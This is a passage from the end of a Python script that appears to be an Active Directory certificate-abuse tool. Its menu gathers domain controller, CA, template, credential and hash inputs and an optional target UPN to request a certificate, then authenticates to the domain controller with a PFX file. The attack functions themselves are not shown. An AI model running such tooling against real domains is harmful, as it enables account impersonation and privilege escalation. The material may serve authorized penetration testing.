        run_certificate_request(dc_ip, domain, ca_name, template, username, password, hashes,
                               target_upn or None, target_dns or None, pfx_out)
    elif mode == '3':
        pfx_file = get_input(Fore.CYAN + "[?] PFX file path       : " + Style.RESET_ALL)
        pfx_path = validate_file(pfx_file, check_empty=False)
        if pfx_path:
            pfx_pass = get_input(Fore.CYAN + "[?] PFX Password (opt)  : " + Style.RESET_ALL, allow_empty=True)
            run_authentication(pfx_path, dc_ip, domain, pfx_pass or None)

    print(Fore.CYAN + "\n[*] Done!" + Style.RESET_ALL)


if __name__ == '__main__':
    main()
